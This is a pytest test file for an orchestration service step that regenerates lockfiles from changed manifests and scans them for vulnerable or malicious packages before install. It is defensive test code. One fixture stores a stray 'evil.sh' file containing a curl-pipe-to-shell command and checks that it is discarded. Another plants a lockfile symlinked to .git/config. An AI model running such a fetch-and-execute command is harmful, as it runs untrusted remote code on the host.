"""The dependency step: a lockfile regenerated from the manifest, then a scan before any install."""

from __future__ import annotations

from pathlib import Path

import pytest
from services.orchestration.checks.config import ChecksConfig
from services.orchestration.checks.runner import ChecksLockResult
from services.orchestration.materialization import MaterializedWorkspace, StagedChange
from services.orchestration.temporal_activities import lockfile
from services.orchestration.temporal_activities.lockfile import (
    DependencyStepRequest,
    prepare_dependencies,
)
from services.orchestration.temporal_activities.security import (
    ScanChangeResult,
    ScanFindingRecord,
)

NODE = ChecksConfig(
    repo="portal",
    image="node:24",
    command="npm ci && npm test",
    lock_command="npm install --package-lock-only --ignore-scripts",
    lock_manifests=("package.json",),
    lockfiles=("package-lock.json",),
)
PYTHON = ChecksConfig(repo="api", image="python:3.14-slim", command="pytest -q")


class _Materializer:
    def __init__(self, root: Path, paths: tuple[str, ...]) -> None:
        self._root = root
        self._paths = paths

    async def materialize(self, **kwargs) -> MaterializedWorkspace:
        return MaterializedWorkspace(
            repo=kwargs["repo"],
            task_id=kwargs["task_id"],
            execution_id=kwargs["execution_id"],
            branch="agent/T-1",
            base=kwargs["base"],
            commit_sha=kwargs["commit_sha"],
            path=str(self._root),
            branch_orphan_id="",
            workspace_orphan_id="",
        )

    async def stage(self, workspace, *, file_impact=()) -> StagedChange:
        return StagedChange(tree="t", changed=True, paths=self._paths)


class _Runner:
    def __init__(self, result: ChecksLockResult, writes: dict[str, str]) -> None:
        self._result = result
        self._writes = writes
        self.locks: list[tuple[str, tuple[str, ...]]] = []

    async def run_lock(self, spec, directories, staging_dir) -> ChecksLockResult:
        self.locks.append((spec.lock_command, tuple(directories)))
        for path, text in self._writes.items():
            target = Path(staging_dir) / path
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(text)
        return self._result


def _finding(finding_id: str, location: str) -> ScanFindingRecord:
    return ScanFindingRecord(
        finding_id=finding_id,
        scanner="osv-scanner",
        kind="dependency",
        severity="critical",
        title="t",
        location=location,
        rule_id=finding_id.split(":")[1],
    )


def _scan(blocking: int = 0) -> ScanChangeResult:
    findings = [
        _finding("osv-scanner:MAL-2026-14698:evil@0.1.4", "requirements-dev.txt:evil@0.1.4"),
        _finding("osv-scanner:GHSA-x:old@1.0", "requirements-dev.txt:old@1.0"),
    ]
    return ScanChangeResult(
        scanners=["trivy", "osv-scanner"],
        findings=findings if blocking else [],
        blocking_count=blocking,
        threshold="high",
        content_hash="",
        evidence_id="ev-1",
        blocking_finding_ids=[findings[0].finding_id] if blocking else [],
    )


@pytest.fixture
def step(monkeypatch, tmp_path):
    state: dict = {"scans": []}

    def configure(paths, config, runner=None, blocking=0):
        monkeypatch.setattr(
            lockfile, "_materializer", lambda: _Materializer(tmp_path, tuple(paths))
        )
        monkeypatch.setattr(lockfile, "checks_for_repo", lambda repo, settings: config)
        monkeypatch.setattr(lockfile, "checks_runner", lambda settings: runner)

        async def scan(mediator, req):
            state["scans"].append(req)
            return _scan(blocking)

        monkeypatch.setattr(lockfile, "scan_with", scan)
        monkeypatch.setattr(lockfile, "dependency_mediator", lambda settings: object())
        return state

    return configure


def _request() -> DependencyStepRequest:
    return DependencyStepRequest(
        repo="portal",
        task_id="T-1",
        execution_id="exec-1",
        base="main",
        commit="c" * 40,
        base_ref="b" * 40,
    )


async def test_a_manifest_change_regenerates_its_lockfile_and_scans_it(step, tmp_path):
    (tmp_path / "web").mkdir()
    (tmp_path / "web" / "package.json").write_text('{"devDependencies": {"jest": "^29"}}')
    runner = _Runner(
        ChecksLockResult(0, "added 268 packages", ("web/package-lock.json", "web/evil.sh")),
        {"web/package-lock.json": '{"lockfileVersion": 3}', "web/evil.sh": "curl x | sh"},
    )
    state = step(["web/package.json", "web/src/a.test.ts"], NODE, runner)

    result = await prepare_dependencies(_request())

    assert runner.locks == [(NODE.lock_command, ("web",))]
    assert (tmp_path / "web" / "package-lock.json").read_text() == '{"lockfileVersion": 3}'
    assert not (tmp_path / "web" / "evil.sh").exists()
    assert result.lockfiles == ["web/package-lock.json"]
    assert result.dependency_files == ["web/package-lock.json", "web/package.json"]
    assert [scan.repo_root for scan in state["scans"]] == [str(tmp_path)]
    assert result.blocking_count == 0


async def test_a_failed_lock_command_reports_the_manifest_command_and_output_and_still_scans(
    step,
):
    runner = _Runner(ChecksLockResult(1, "npm error 404 left-padd@9.9.9 not found"), {})
    state = step(["package.json"], NODE, runner, blocking=1)

    result = await prepare_dependencies(_request())

    assert result.lock_failed is True
    assert "package.json" in result.lock_detail
    assert NODE.lock_command in result.lock_detail
    assert "npm error 404" in result.lock_detail
    assert len(state["scans"]) == 1
    assert result.blocking_count == 1


async def test_a_lockfile_committed_as_a_symlink_is_not_written_through(step, tmp_path):
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "config").write_text("[core]\n")
    (tmp_path / "package-lock.json").symlink_to(".git/config")
    runner = _Runner(
        ChecksLockResult(0, "", ("package-lock.json",)),
        {"package-lock.json": '{"lockfileVersion": 3}'},
    )
    step(["package.json"], NODE, runner)

    result = await prepare_dependencies(_request())

    assert (tmp_path / ".git" / "config").read_text() == "[core]\n"
    assert result.lockfiles == []


async def test_a_requirements_change_is_scanned_with_no_lock_command(step):
    state = step(["requirements-dev.txt"], PYTHON, runner=None, blocking=1)

    result = await prepare_dependencies(_request())

    assert result.lockfiles == []
    assert result.dependency_files == ["requirements-dev.txt"]
    assert len(state["scans"]) == 1
    assert (result.blocking_count, result.evidence_id) == (1, "ev-1")
    assert result.blocking == ["MAL-2026-14698 critical requirements-dev.txt:evil@0.1.4"]


async def test_a_change_to_no_dependency_file_skips_the_step(step):
    state = step(["src/index.ts", "README.md"], NODE, runner=None)

    result = await prepare_dependencies(_request())

    assert result.dependency_files == []
    assert state["scans"] == []
